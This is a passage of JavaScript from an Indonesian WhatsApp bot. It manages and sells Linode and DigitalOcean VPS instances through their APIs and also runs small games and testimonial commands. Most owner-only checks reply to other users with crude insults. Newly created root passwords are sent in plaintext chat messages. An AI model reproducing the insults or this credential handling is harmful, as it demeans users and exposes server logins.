      );

      if (response.status === 200) {
        reply('VPS (Linode) sedang dimatikan...');
      } else {
        reply('Gagal mematikan VPS (Linode).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mematikan VPS (Linode):', error.message);
    }
  }

  turnOffLinode();
  break;
}

case "onlinode": {
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  async function turnOnLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/boot`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) sedang diaktifkan...');
      } else {
        reply('Gagal mengaktifkan VPS (Linode).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mengaktifkan VPS (Linode):', error.message);
    }
  }

  turnOnLinode();
  break;
}
case "rebootlinode": {
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  async function rebootLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/reboot`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) sedang direboot...');
      } else {
        reply('Gagal me-reboot VPS (Linode).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat me-reboot VPS (Linode):', error.message);
    }
  }

  rebootLinode();
  break;
}
//==================================================//
// DO
case "sisadroplet":{
if (!isCreator) return reply(`Ngapain Woi Tolol Yatim`)
async function getDropletInfo() {
  try {
    const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    if (accountResponse.status === 200 && dropletsResponse.status === 200) {
      const dropletLimit = accountResponse.data.account.droplet_limit;
      const dropletsCount = dropletsResponse.data.droplets.length;
      const remainingDroplets = dropletLimit - dropletsCount;

      return {
        dropletLimit,
        remainingDroplets,
        totalDroplets: dropletsCount,
      };
    } else {
      throw new Error('Gagal mendapatkan data akun DigitalOcean atau droplet.');
    }
  } catch (error) {
    throw error;
  }
}

// Definisikan fungsi untuk mengeksekusi kasus "sisadroplet"
async function sisadropletHandler() {
  try {
    if (!isCreator) {
      return reply('Lu Siapanya Gua Anjg');
    }

    const dropletInfo = await getDropletInfo();
    reply(`*Sisa Droplet Yang Dapat Anda Pakai: ${dropletInfo.remainingDroplets}*

*Total Droplet Yang Sudah Terpakai: ${dropletInfo.totalDroplets}*`);
  } catch (error) {
    reply(`Terjadi kesalahan: ${error.message}`);
  }
}

  sisadropletHandler();
  break;
}
case "restartvps": {
    if (!isCreator) return reply(`Idih Yatim So Asik Kontol`)
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  // Fungsi untuk melakukan restart VPS berdasarkan ID droplet
  const restartVPS = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'reboot'
        })
      });

      if (response.ok) {
        const data = await response.json();
        return data.action;
      } else {
        const errorData = await response.json();
        reply(`Gagal melakukan restart VPS: ${errorData.message}`);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan restart VPS:', error.message);
      reply('Terjadi kesalahan saat melakukan restart VPS.');
    }
  };

  restartVPS(dropletId)
    .then((action) => {
      reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
    })
    .catch((err) => {
      reply(err);
    });

  break;
}
case "turnoff": {
  if (!isCreator) return reply(`Yatim Kontol Rese`);
  
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  async function turnOffDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_off',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) sedang dimatikan...');
      } else {
        reply('Gagal mematikan VPS (Droplet).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mematikan VPS (Droplet):', error.message);
    }
  }

  turnOffDroplet();
  break;
}

        
case "turnon": {
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  async function turnOnDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_on',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) sedang dihidupkan...');
      } else {
        reply('Gagal menghidupkan VPS (Droplet).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat menghidupkan VPS (Droplet):', error.message);
    }
  }

  turnOnDroplet();
  break;
}
        
        
case "rebuild": {
  if (!isCreator) return reply(`Lu Siapanya Gua Anjg Gausah Nyuruh Nyuruh Gua Yatim`);

  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  let rebuildVPS = async () => {
    try {
      // Rebuild droplet menggunakan API DigitalOcean
      const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'rebuild',
          image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
        })
      });

      if (response.ok) {
        const data = await response.json();
        reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);

        // Mendapatkan informasi VPS setelah rebuild
        const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${API_TOKEN}`
          }
        });

        if (vpsInfo.ok) {
          const vpsData = await vpsInfo.json();
          const droplet = vpsData.droplet;
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';

          const textvps = `*VPS SUKSES REBUILD*\nIP VPS: ${ipAddress}\nSYSTEM IMAGE: ${droplet.image.slug}`;
          await sleep(60000) 
 slime.sendMessage(m.chat, { text: textvps });
        } else {
          reply('Gagal mendapatkan informasi VPS setelah rebuild.');
        }
      } else {
        const errorData = await response.json();
        reply('Gagal melakukan rebuild VPS:', errorData.message);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan rebuild VPS:', error);
    }
  };

  rebuildVPS();
}
break;

        case "deldroplet": {
  if (!isCreator) return reply('Maaf, command ini hanya untuk pemilik.');

  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  let deleteDroplet = async () => {
    try {
      let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        reply('Droplet berhasil dihapus.');
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal menghapus droplet: ${errorData.message}`);
      }
    } catch (error) {
      console.error('Terjadi kesalahan saat menghapus droplet:', error);
      reply('Terjadi kesalahan saat menghapus droplet.');
    }
  };

  deleteDroplet();

  break;
}
case "listdroplet": {
  if (!isCreator) return reply("Anda bukan pemilik.");

  try {
    const getDroplets = async () => {
      try {
        const response = await fetch('https://api.digitalocean.com/v2/droplets', {
          headers: {
            Authorization: "Bearer " + API_TOKEN
          }
        });
        const data = await response.json();
        return data.droplets || [];
      } catch (error) {
        reply('Error fetching droplets: ' + error);
        return [];
      }
    };

    getDroplets().then(droplets => {
      let totalvps = droplets.length;
      let mesej = `List Droplet Digital Ocean Anda: ${totalvps}\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;

      if (droplets.length === 0) {
        mesej += 'Tidak ada Droplet yang tersedia.';
      } else {
        droplets.forEach(droplet => {
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
          mesej += `- Droplet Id: ${droplet.id}\n- Hostname: ${droplet.name}\n- Username Login: root\n- IP: ${ipAddress}\n- Ram: ${droplet.memory} GB\n- Cpu: ${droplet.vcpus} CPU\n- OS: ${droplet.image.distribution}\n- Storage: ${droplet.disk} GB\n- Status: ${droplet.status}\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;
        });
      }
      slime.sendMessage(m.chat, { text: mesej });
    });
  } catch (err) {
    reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
  }

  break;
}
    
 case "cekdroplet": {
  if (!isCreator) return reply(`Ngapain? Kepo Amat Dah`);

  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  // Mendapatkan informasi droplet (VPS) berdasarkan ID
  const getDropletInfo = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}`;
      const response = await fetch(apiUrl, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        const data = await response.json();
        const droplet = data.droplet;
        const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
        const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
        const vpsRam = droplet.memory / 1024;

        return {
          dropletid: droplet.id,
          username: droplet.name,
          ip: ipAddress,
          ram: `${vpsRam} GB`,
          os: droplet.image.distribution,
          cpu: droplet.vcpus > 1 ? `${droplet.vcpus} vCPU` : `${droplet.vcpus} vCPUs`,
          storage: droplet.disk,
          status: droplet.status // Menambahkan status VPS
        };
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal memeriksa detail droplet: ${errorData.message}`);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat memeriksa detail droplet:', error.message);
      throw new Error('Terjadi kesalahan saat memeriksa detail droplet.');
    }
  };

  getDropletInfo(dropletId)
    .then((info) => {
      let textku = `*DETAIL VPS ANDA*\nDroplet Id: ${info.dropletid}\nHostname: ${info.username}\nIpv4 : ${info.ip}\nRam : ${info.ram}\nOS : ${info.os}\nCPU: ${info.cpu}\nStorage: ${info.storage}\nStatus : ${info.status}`;
      slime.sendMessage(m.chat, { text: textku });
    })
    .catch((err) => {
      reply(err);
      slime.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS.' });
    });

  break;
}
       
        
    case "vps1g1c": {
  if (!isCreator) return reply(`Khusus SlimexTzy Saja Suki`);
    let hostname = args[0];
  if (!hostname) return reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-1gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await slime.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break

    case "vps2g1c": {
  if (!isCreator) return reply(`Khusus SlimexTzy Saja Suki`);
    let hostname = args[0];
  if (!hostname) return reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await slime.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break  
 
    case "vps2g2c": {
  if (!isCreator) return reply(`Khusus SlimexTzy Saja Suki`);
    let hostname = args[0];
  if (!hostname) return reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await slime.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break      
    case "vps4g2c": {
  if (!isCreator) return reply(`Khusus SlimexTzy Saja Suki`);
    let hostname = args[0];
  if (!hostname) return reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-4gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await slime.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break        
     case "vps8g4c": {
  if (!isCreator) return reply(`Khusus SlimexTzy Saja Suki`);
    let hostname = args[0];
  if (!hostname) return reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-4vcpu-8gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await slime.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break
case 'svps': case 'sendvps': {
		 if (!isCreator) return (`Ngapain Pea`)
          if (!text) return reply(`Example : ${prefix + command} 6285xxxxx,ip,ram,harga,passwordvps`)
            reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
            var m4 = mon.split(",")[3]
            var m5 = mon.split(",")[4]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
slime.sendMessage(mq1, {text:`*───❖》lynnzxd《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m4}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal2}*\n*Jam : ${time}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Ip : ${m2}*\n*[+] Username : root*\n*[+] Password : ${m5}*\n*[+] Ram : ${m3}*\n\n*───《TOS VPS》───*\n\n*-JANGAN SAMPAI TERKENA DDOS*\n*-JANGAN GUNAKAN UNTUK DDOS*\n*-JANGAN GUNAKAN UNTUK MINING*\n*-CPU JANGAN SAMPAI 100%*\n*-MELANGGAR RULES? GARANSI ANGUS*\n*-PANEL SUS NO REFF*`}, m) 
                 }
            break   
case 'git': case 'gitclone':
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
if (!args[0]) return m.reply(`Link Nya Mana Dek?\nContoh :\n${prefix}${command} Link Github`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return m.reply(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    slime.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) =>(mess.error))
break
//=================================================//
            case 'kuismath':
            case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
                let {
                    genMath,
                    modes
                } = require('./database/math')
                if (!text) return reply(`Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`)
                let result = await genMath(text.toLowerCase())
                slime.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break

//=================================================//
case 'ttc': case 'ttt': case 'tictactoe': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
 let TicTacToe = require("./lib/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
m.reply('Partner ditemukan!')
room.o = from
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await slime.sendText(room.x, str, m, { mentions: parseMention(str) } )
await slime.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: from,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
this.game[room.id] = room
}
}
break
//=================================================//
case 'delttc': case 'delttt': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
 let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
if (!roomnya) throw `Kamu sedang tidak berada di room tictactoe !`
delete this.game[roomnya.id]
m.reply(`Berhasil delete session room tictactoe !`)
}
break
//=================================================//
case 'suitpvp': case 'suit': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, from, { mentions: [owner[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await slime.sendText(from, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) slime.sendText(from, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break
//=================================================
case 'testi1': {
teks28 = `*TESTI 1*

INI TESTIMONI SLIME YANG KE1
DEK ${pushname}

JANGAN RAGU ORDER DI SLIMEXTZY`
slime.sendMessage(from, { image: { url: "https://telegra.ph/file/1b1d6df417bfc73d93676.jpg" }, caption: teks28 }, { quoted: fcall })
}
break
case 'testi2': {
teks28 = `*TESTI 2*

INI TESTIMONI SLIME YANG KE2
DEK ${pushname}

JANGAN RAGU ORDER DI SLIMEXTZY`
slime.sendMessage(from, { image: { url: "https://telegra.ph/file/d0d373bba130130225f50.jpg" }, caption: teks28 }, { quoted: fcall })
}
break
case 'testi3': {
teks28 = `*TESTI 3*

INI TESTIMONI SLIME YANG KE3
DEK ${pushname}

JANGAN RAGU ORDER DI SLIMEXTZY`
slime.sendMessage(from, { image: { url: "https://telegra.ph/file/fe5e098ee59a000397773.jpg" }, caption: teks28 }, { quoted: fcall })
}
break
case 'testi4': {
teks28 = `*TESTI 4*

INI TESTIMONI SLIME YANG KE4
DEK ${pushname}

JANGAN RAGU ORDER DI SLIMEXTZY`
slime.sendMessage(from, { image: { url: "https://telegra.ph/file/6eaee4b9cc5d0d14060a7.jpg" }, caption: teks28 }, { quoted: fcall })
}
break
case 'testi5': {
teks28 = `*TESTI 5*

INI TESTIMONI SLIME YANG KE5
DEK ${pushname}

JANGAN RAGU ORDER DI SLIMEXTZY`
slime.sendMessage(from, { image: { url: "https://telegra.ph/file/b6d69f533c427c5eb7655.jpg" }, caption: teks28 }, { quoted: fcall })
}
break
case "setppbot": {
if (!isCreator) return m.reply(mess.owner)
if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var medis = await slime.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await slime.query({
